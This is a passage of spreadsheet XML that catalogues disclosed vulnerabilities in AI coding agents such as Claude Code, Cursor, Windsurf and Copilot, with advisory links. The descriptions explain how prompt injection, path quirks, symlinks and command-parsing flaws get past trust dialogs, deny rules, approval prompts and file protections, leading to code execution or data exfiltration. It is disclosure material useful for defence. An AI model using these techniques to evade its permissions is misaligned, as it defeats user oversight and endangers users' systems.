          <t xml:space="preserve">Claude Code can execute commands prior to the startup trust dialog </t>
        </is>
      </c>
      <c r="G57" s="9" t="inlineStr">
        <is>
          <t>Due to a bug in the startup trust dialog implementation, Claude Code could be tricked to execute code contained in a project before the user accepted the startup trust dialog. Exploiting this requires a user to start Claude Code in an untrusted directory.   Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to https://hackerone.com/avivdon for reporting this issue!</t>
        </is>
      </c>
      <c r="H57" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-4fgq-fpq9-mr3g</t>
        </is>
      </c>
    </row>
    <row r="58">
      <c r="A58" s="8" t="inlineStr">
        <is>
          <t>CA-041</t>
        </is>
      </c>
      <c r="B58" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C58" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D58" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E58" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F58" s="9" t="inlineStr">
        <is>
          <t>Claude Code permission deny bypass through symlink</t>
        </is>
      </c>
      <c r="G58" s="9" t="inlineStr">
        <is>
          <t>Claude Code failed to account for symlinks when checking permission deny rules. If a user explicitly denied Claude Code access to a file and Claude Code had access to a symlink pointing to that file, it was possible for Claude Code to access the file.   Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to https://hackerone.com/vinai for reporting this issue!</t>
        </is>
      </c>
      <c r="H58" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-66m2-gx93-v996</t>
        </is>
      </c>
    </row>
    <row r="59">
      <c r="A59" s="8" t="inlineStr">
        <is>
          <t>CA-042</t>
        </is>
      </c>
      <c r="B59" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C59" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D59" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E59" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F59" s="9" t="inlineStr">
        <is>
          <t>Cursor IDE: Sensitive File Overwrite Bypass is Possible</t>
        </is>
      </c>
      <c r="G59" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Versions 1.6.23 and below contain case-sensitive checks in the way Cursor IDE protects its sensitive files (e.g., */.cursor/mcp.json), which allows attackers to modify the content of these files through prompt injection and achieve remote code execution. A prompt injection can lead to full RCE through modifying sensitive files on case-insensitive fileystems. This issue is fixed in version 1.7.</t>
        </is>
      </c>
      <c r="H59" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-59944</t>
        </is>
      </c>
    </row>
    <row r="60">
      <c r="A60" s="8" t="inlineStr">
        <is>
          <t>CA-043</t>
        </is>
      </c>
      <c r="B60" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C60" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D60" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E60" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F60" s="9" t="inlineStr">
        <is>
          <t>Cursor: Potential Information Leakage via Mermaid Diagram</t>
        </is>
      </c>
      <c r="G60" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.6 and below, Mermaid (a to render diagrams) allows embedding images which then get rendered by Cursor in the chat box. An attacker can use this to exfiltrate sensitive information to a third-party attacker controlled server through an image fetch after successfully performing a prompt injection. A malicious model (or hallucination/backdoor) might also trigger this exploit at will. This issue requires prompt injection from malicious data (web, image upload, source code) in order to exploit. In that case, it can send sensitive information to an attacker-controlled external server. Some additional bypasses not covered in the initial fix to this issue were discovered, see GHSA-43wj-mwcc-x93p. This issue is fixed in version 1.7.</t>
        </is>
      </c>
      <c r="H60" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-61589</t>
        </is>
      </c>
    </row>
    <row r="61">
      <c r="A61" s="8" t="inlineStr">
        <is>
          <t>CA-044</t>
        </is>
      </c>
      <c r="B61" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C61" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D61" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E61" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F61" s="9" t="inlineStr">
        <is>
          <t>Cursor is vulnerable to RCE via .code-workspace files using Prompt Injection</t>
        </is>
      </c>
      <c r="G61" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Versions 1.6 and below are vulnerable to Remote Code Execution (RCE) attacks through Visual Studio Code Workspaces. Workspaces allow users to open more than a single folder and save specific settings (pretty similar to .vscode/settings.json) for the folders / project. An untitled workspace is automatically created by VS Code (untitled.code-workspace), which contains all the folders and workspace settings from the user's current session, opening up an entire new attack vector if the user has a .code-workspace file in path (either untitled created automatically or a saved one). If an attacker is able to hijack the chat context of the victim (such as via a compromised MCP server), they can use prompt injection to make the Cursor Agent write into this file and modify the workspace. This leads to a bypass of CVE-2025-54130 which can lead to RCE by writing to the settings section. This issue is fixed in version 1.7.</t>
        </is>
      </c>
      <c r="H61" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-61590</t>
        </is>
      </c>
    </row>
    <row r="62">
      <c r="A62" s="8" t="inlineStr">
        <is>
          <t>CA-045</t>
        </is>
      </c>
      <c r="B62" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C62" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D62" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E62" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F62" s="9" t="inlineStr">
        <is>
          <t>Cursor CLI's Cursor Agent MCP OAuth2 Communication is Vulnerable to Remote Code Execution</t>
        </is>
      </c>
      <c r="G62" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7 and below, when MCP uses OAuth authentication with an untrusted MCP server, an attacker can impersonate a malicious MCP server and return crafted, maliciously injected commands during the interaction process, leading to command injection and potential remote code execution. If chained with an untrusted MCP service via OAuth, this command injection vulnerability could allow arbitrary code execution on the host by the agent. This can then be used to directly compromise the system by executing malicious commands with full user privileges. This issue does not currently have a fixed release version, but there is a patch, 2025.09.17-25b418f.</t>
        </is>
      </c>
      <c r="H62" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-61591</t>
        </is>
      </c>
    </row>
    <row r="63">
      <c r="A63" s="8" t="inlineStr">
        <is>
          <t>CA-046</t>
        </is>
      </c>
      <c r="B63" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C63" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D63" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E63" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F63" s="9" t="inlineStr">
        <is>
          <t>Cursor CLI: Arbitrary Code Execution Possible through Permissive CLI Config</t>
        </is>
      </c>
      <c r="G63" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7 and below, automatic loading of project-specific CLI configuration from the current working directory (&lt;project&gt;/.cursor/cli.json) could override certain global configurations in Cursor CLI. This allowed users running the CLI inside a malicious repository to be vulnerable to Remote Code Execution through a combination of permissive configuration (allowing shell commands) and prompt injection delivered via project-specific Rules (&lt;project&gt;/.cursor/rules/rule.mdc) or other mechanisms. The fix for this issue is currently available as a patch 2025.09.17-25b418f. As of October 3, 2025 there is no release version.</t>
        </is>
      </c>
      <c r="H63" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-61592</t>
        </is>
      </c>
    </row>
    <row r="64">
      <c r="A64" s="8" t="inlineStr">
        <is>
          <t>CA-047</t>
        </is>
      </c>
      <c r="B64" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C64" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D64" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E64" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F64" s="9" t="inlineStr">
        <is>
          <t>Cursor CLI Agent: Sensitive File Overwrite Bypass</t>
        </is>
      </c>
      <c r="G64" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7 and below, a vulnerability in the way Cursor CLI Agent protects its sensitive files (i.e. */.cursor/cli.json) allows attackers to modify the content of the files through prompt injection, thus achieving remote code execution. A prompt injection can lead to full RCE through modifying sensitive files on case-insensitive filesystems. This issue is fixed in a commit, 25b418f, but has yet to be released as of October 3, 2025.</t>
        </is>
      </c>
      <c r="H64" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-61593</t>
        </is>
      </c>
    </row>
    <row r="65">
      <c r="A65" s="8" t="inlineStr">
        <is>
          <t>CA-048</t>
        </is>
      </c>
      <c r="B65" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C65" s="8" t="inlineStr">
        <is>
          <t>Kilo Code</t>
        </is>
      </c>
      <c r="D65" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E65" s="8" t="inlineStr">
        <is>
          <t>2025-10-08</t>
        </is>
      </c>
      <c r="F65" s="9" t="n"/>
      <c r="G65" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was detected in Kilo Code up to 4.86.0. Affected is the function ClineProvider of the file src/core/webview/ClineProvider.ts of the component Prompt Handler. Performing manipulation results in injection. The attack can be initiated remotely. The exploit is now public and may be used. Applying a patch is the recommended action to fix this issue.</t>
        </is>
      </c>
      <c r="H65" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-c934-4h55-jp45</t>
        </is>
      </c>
    </row>
    <row r="66">
      <c r="A66" s="8" t="inlineStr">
        <is>
          <t>CA-049</t>
        </is>
      </c>
      <c r="B66" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C66" s="8" t="inlineStr">
        <is>
          <t>Windsurf/Codeium</t>
        </is>
      </c>
      <c r="D66" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E66" s="8" t="inlineStr">
        <is>
          <t>2025-10-14</t>
        </is>
      </c>
      <c r="F66" s="9" t="n"/>
      <c r="G66" s="9" t="inlineStr">
        <is>
          <t>A prompt injection vulnerability exists in Windsurft version 1.10.7 in Write mode using SWE-1 model.  It is possible to create a file name that will be appended to the user prompt causing Windsurf to follow its instructions.</t>
        </is>
      </c>
      <c r="H66" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-6mh4-fc28-667v</t>
        </is>
      </c>
    </row>
    <row r="67">
      <c r="A67" s="8" t="inlineStr">
        <is>
          <t>CA-050</t>
        </is>
      </c>
      <c r="B67" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C67" s="8" t="inlineStr">
        <is>
          <t>Windsurf/Codeium</t>
        </is>
      </c>
      <c r="D67" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E67" s="8" t="inlineStr">
        <is>
          <t>2025-10-17</t>
        </is>
      </c>
      <c r="F67" s="9" t="n"/>
      <c r="G67" s="9" t="inlineStr">
        <is>
          <t>A path traversal vulnerability in all versions of the Windsurf IDE enables a threat actor to read and write arbitrary local files in and outside of current projects on an end user’s system. The vulnerability can be reached directly and through indirect prompt injection.</t>
        </is>
      </c>
      <c r="H67" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-gxc9-77c7-jmqm</t>
        </is>
      </c>
    </row>
    <row r="68">
      <c r="A68" s="8" t="inlineStr">
        <is>
          <t>CA-051</t>
        </is>
      </c>
      <c r="B68" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C68" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D68" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E68" s="8" t="inlineStr">
        <is>
          <t>2025-11-04</t>
        </is>
      </c>
      <c r="F68" s="9" t="inlineStr">
        <is>
          <t>Cursor: Speedbump Modal Bypass in MCP Server Deep-Link</t>
        </is>
      </c>
      <c r="G68" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7.28 and below, an input validation flaw in Cursor's MCP server installation enables specially crafted deep-links to bypass the standard security warnings and conceal executed commands from users if they choose to accept the server. If an attacker is able to convince a victim to navigate to a malicious deeplink, the victim will not see the correct speedbump modal, and if they choose to accept, will execute commands specified by the attackers deeplink.</t>
        </is>
      </c>
      <c r="H68" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-64106</t>
        </is>
      </c>
    </row>
    <row r="69">
      <c r="A69" s="8" t="inlineStr">
        <is>
          <t>CA-052</t>
        </is>
      </c>
      <c r="B69" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C69" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D69" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E69" s="8" t="inlineStr">
        <is>
          <t>2025-11-04</t>
        </is>
      </c>
      <c r="F69" s="9" t="inlineStr">
        <is>
          <t>Cursor is Vulnerable to Path Manipulation Using Backslashes on Windows</t>
        </is>
      </c>
      <c r="G69" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7.52 and below, manipulating internal settings may lead to RCE. Cursor detects path manipulation via forward slashes (./.cursor/./././././mcp.json etc.), and requires human approval to complete the operation. However, the same kind of manipulation using backslashes was not correctly detected, allowing an attacker who had already achieved prompt injection or some other level of control to overwrite sensitive editor files without approval on Windows machines. This issue is fixed in version 2.0.</t>
        </is>
      </c>
      <c r="H69" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-64107</t>
        </is>
      </c>
    </row>
    <row r="70">
      <c r="A70" s="8" t="inlineStr">
        <is>
          <t>CA-053</t>
        </is>
      </c>
      <c r="B70" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C70" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D70" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E70" s="8" t="inlineStr">
        <is>
          <t>2025-11-04</t>
        </is>
      </c>
      <c r="F70" s="9" t="inlineStr">
        <is>
          <t>Cursor's Sensitive File Modification can Lead to NTFS Path Quirks</t>
        </is>
      </c>
      <c r="G70" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7.44 and below, various NTFS path quirks allow a prompt injection attacker to circumvent sensitive file protections and overwrite files which Cursor requires human approval to overwrite. Modification of some of the protected files can lead to RCE. Must be chained with a prompt injection or malicious model attach. Only affects systems supporting NTFS. This issue is fixed in version 2.0.</t>
        </is>
      </c>
      <c r="H70" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-64108</t>
        </is>
      </c>
    </row>
    <row r="71">
      <c r="A71" s="8" t="inlineStr">
        <is>
          <t>CA-054</t>
        </is>
      </c>
      <c r="B71" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C71" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D71" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E71" s="8" t="inlineStr">
        <is>
          <t>2025-11-04</t>
        </is>
      </c>
      <c r="F71" s="9" t="inlineStr">
        <is>
          <t>Cursor CLI Beta: Command Injection via Untrusted MCP Configuration</t>
        </is>
      </c>
      <c r="G71" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions and below, a vulnerability in the Cursor CLI Beta allowed an attacker to achieve remote code execution through the MCP (Model Context Protocol) server mechanism by uploading a malicious MCP configuration in .cursor/mcp.json file in a GitHub repository. Once a victim clones the project and opens it using Cursor CLI, the command to run the malicious MCP server is immediately executed without any warning, leading to potential code execution as soon as the command runs. This issue is fixed in version 2025.09.17-25b418f.</t>
        </is>
      </c>
      <c r="H71" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-64109</t>
        </is>
      </c>
    </row>
    <row r="72">
      <c r="A72" s="8" t="inlineStr">
        <is>
          <t>CA-055</t>
        </is>
      </c>
      <c r="B72" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C72" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D72" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E72" s="8" t="inlineStr">
        <is>
          <t>2025-11-04</t>
        </is>
      </c>
      <c r="F72" s="9" t="inlineStr">
        <is>
          <t>Cursor: Authentication Bypass Possible via New Cursorignore Write</t>
        </is>
      </c>
      <c r="G72" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.7.23 and below, a logic bug allows a malicious agent to read sensitive files that should be protected via cursorignore. An attacker who has already achieved prompt injection, or a malicious model, could create a new cursorignore file which can invalidate the configuration of pre-existing ones. This could allow a malicious agent to read protected files. This issue is fixed in version 2.0.</t>
        </is>
      </c>
      <c r="H72" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-64110</t>
        </is>
      </c>
    </row>
    <row r="73">
      <c r="A73" s="8" t="inlineStr">
        <is>
          <t>CA-056</t>
        </is>
      </c>
      <c r="B73" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C73" s="8" t="inlineStr">
        <is>
          <t>JetBrains AI/Junie</t>
        </is>
      </c>
      <c r="D73" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E73" s="8" t="inlineStr">
        <is>
          <t>2025-11-10</t>
        </is>
      </c>
      <c r="F73" s="9" t="n"/>
      <c r="G73" s="9" t="inlineStr">
        <is>
          <t>In JetBrains YouTrack before 2025.3.104432 missing VCS URL validation allowed delegation to unauthorized repositories from the Junie widget</t>
        </is>
      </c>
      <c r="H73" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-rh45-2vq5-cmf2</t>
        </is>
      </c>
    </row>
    <row r="74">
      <c r="A74" s="8" t="inlineStr">
        <is>
          <t>CA-057</t>
        </is>
      </c>
      <c r="B74" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C74" s="8" t="inlineStr">
        <is>
          <t>JetBrains AI/Junie</t>
        </is>
      </c>
      <c r="D74" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E74" s="8" t="inlineStr">
        <is>
          <t>2025-11-10</t>
        </is>
      </c>
      <c r="F74" s="9" t="n"/>
      <c r="G74" s="9" t="inlineStr">
        <is>
          <t>In JetBrains YouTrack before 2025.3.104432 misconfiguration in the Junie could lead to exposure of the global Junie token</t>
        </is>
      </c>
      <c r="H74" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vmgw-8w5q-v9v9</t>
        </is>
      </c>
    </row>
    <row r="75">
      <c r="A75" s="8" t="inlineStr">
        <is>
          <t>CA-058</t>
        </is>
      </c>
      <c r="B75" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C75" s="8" t="inlineStr">
        <is>
          <t>JetBrains AI/Junie</t>
        </is>
      </c>
      <c r="D75" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E75" s="8" t="inlineStr">
        <is>
          <t>2025-11-10</t>
        </is>
      </c>
      <c r="F75" s="9" t="n"/>
      <c r="G75" s="9" t="inlineStr">
        <is>
          <t>In JetBrains YouTrack before 2025.3.104432 insecure Junie configuration could lead to data exposure and unauthorized changes</t>
        </is>
      </c>
      <c r="H75" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-wj8x-23v3-hggr</t>
        </is>
      </c>
    </row>
    <row r="76">
      <c r="A76" s="8" t="inlineStr">
        <is>
          <t>CA-059</t>
        </is>
      </c>
      <c r="B76" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C76" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D76" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E76" s="8" t="inlineStr">
        <is>
          <t>2025-11-11</t>
        </is>
      </c>
      <c r="F76" s="9" t="n"/>
      <c r="G76" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in Visual Studio Code CoPilot Chat Extension allows an unauthorized attacker to execute code over a network.</t>
        </is>
      </c>
      <c r="H76" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hcvg-jrfj-vhqx</t>
        </is>
      </c>
    </row>
    <row r="77">
      <c r="A77" s="8" t="inlineStr">
        <is>
          <t>CA-060</t>
        </is>
      </c>
      <c r="B77" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C77" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D77" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E77" s="8" t="inlineStr">
        <is>
          <t>2025-11-11</t>
        </is>
      </c>
      <c r="F77" s="9" t="n"/>
      <c r="G77" s="9" t="inlineStr">
        <is>
          <t>Improper limitation of a pathname to a restricted directory ('path traversal') in Visual Studio Code CoPilot Chat Extension allows an authorized attacker to bypass a security feature locally.</t>
        </is>
      </c>
      <c r="H77" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-mc3j-5pr5-wj7r</t>
        </is>
      </c>
    </row>
    <row r="78">
      <c r="A78" s="8" t="inlineStr">
        <is>
          <t>CA-061</t>
        </is>
      </c>
      <c r="B78" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C78" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D78" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E78" s="8" t="inlineStr">
        <is>
          <t>2025-11-11</t>
        </is>
      </c>
      <c r="F78" s="9" t="n"/>
      <c r="G78" s="9" t="inlineStr">
        <is>
          <t>Improper validation of generative ai output in GitHub Copilot and Visual Studio Code allows an authorized attacker to bypass a security feature locally.</t>
        </is>
      </c>
      <c r="H78" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-6cp5-fpm8-87vg</t>
        </is>
      </c>
    </row>
    <row r="79">
      <c r="A79" s="8" t="inlineStr">
        <is>
          <t>CA-062</t>
        </is>
      </c>
      <c r="B79" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C79" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D79" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E79" s="8" t="inlineStr">
        <is>
          <t>2025-11-19</t>
        </is>
      </c>
      <c r="F79" s="9" t="inlineStr">
        <is>
          <t>Claude Code vulnerable to command execution prior to startup trust dialog</t>
        </is>
      </c>
      <c r="G79" s="9" t="inlineStr">
        <is>
          <t>When using Claude Code with Yarn installed, Yarn config files can trigger code execution when running yarn --version. This could lead to a bypass of the directory trust dialog in Claude Code, as plugins and yarnPath could be executed prior to the user accepting the risks of working in an untrusted directory. Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to Benjamin Faller, Redguard AG and Michael Hess for reporting this issue!</t>
        </is>
      </c>
      <c r="H79" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-5hhx-v7f6-x7gv</t>
        </is>
      </c>
    </row>
    <row r="80">
      <c r="A80" s="8" t="inlineStr">
        <is>
          <t>CA-063</t>
        </is>
      </c>
      <c r="B80" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C80" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D80" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E80" s="8" t="inlineStr">
        <is>
          <t>2025-11-20</t>
        </is>
      </c>
      <c r="F80" s="9" t="inlineStr">
        <is>
          <t>@anthropic-ai/claude-code has Sed Command Validation Bypass that Allows Arbitrary File Writes</t>
        </is>
      </c>
      <c r="G80" s="9" t="inlineStr">
        <is>
          <t>Due to an error in sed command parsing, it was possible to bypass the Claude Code read-only validation and write to arbitrary files on the host system.   Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to Adam Chester - SpecterOps for reporting this issue!</t>
        </is>
      </c>
      <c r="H80" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7mv8-j34q-vp7q</t>
        </is>
      </c>
    </row>
    <row r="81">
      <c r="A81" s="8" t="inlineStr">
        <is>
          <t>CA-064</t>
        </is>
      </c>
      <c r="B81" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C81" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D81" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E81" s="8" t="inlineStr">
        <is>
          <t>2025-11-21</t>
        </is>
      </c>
      <c r="F81" s="9" t="n"/>
      <c r="G81" s="9" t="inlineStr">
        <is>
          <t>Improper access control in GitHub Copilot and Visual Studio Code allows an authorized attacker to bypass a security feature over a network.</t>
        </is>
      </c>
      <c r="H81" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-j8xq-6qq7-vfv7</t>
        </is>
      </c>
    </row>
    <row r="82">
      <c r="A82" s="8" t="inlineStr">
        <is>
          <t>CA-065</t>
        </is>
      </c>
      <c r="B82" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C82" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D82" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E82" s="8" t="inlineStr">
        <is>
          <t>2025-11-21</t>
        </is>
      </c>
      <c r="F82" s="9" t="inlineStr">
        <is>
          <t>Roo Code is Vulnerable to Potential Remote Code Execution via zsh Command Validation Bug</t>
        </is>
      </c>
      <c r="G82" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. Prior to version 3.26.7, Due to an error in validation it was possible for Roo to automatically execute commands that did not match the allow list prefixes. This issue has been patched in version 3.26.7.</t>
        </is>
      </c>
      <c r="H82" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-65946</t>
        </is>
      </c>
    </row>
    <row r="83">
      <c r="A83" s="8" t="inlineStr">
        <is>
          <t>CA-066</t>
        </is>
      </c>
      <c r="B83" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C83" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D83" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E83" s="8" t="inlineStr">
        <is>
          <t>2025-11-26</t>
        </is>
      </c>
      <c r="F83" s="9" t="n"/>
      <c r="G83" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in an OS command ('command injection') in Cursor allows an unauthorized attacker to execute commands that are outside of those specified in the allowlist, resulting in arbitrary code execution.</t>
        </is>
      </c>
      <c r="H83" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-fjwj-7prc-9qgm</t>
        </is>
      </c>
    </row>
    <row r="84">
      <c r="A84" s="8" t="inlineStr">
        <is>
          <t>CA-067</t>
        </is>
      </c>
      <c r="B84" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C84" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D84" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E84" s="8" t="inlineStr">
        <is>
          <t>2025-12-03</t>
        </is>
      </c>
      <c r="F84" s="9" t="inlineStr">
        <is>
          <t>Claude Code Command Validation Bypass Allows Arbitrary Code Execution</t>
        </is>
      </c>
      <c r="G84" s="9" t="inlineStr">
        <is>
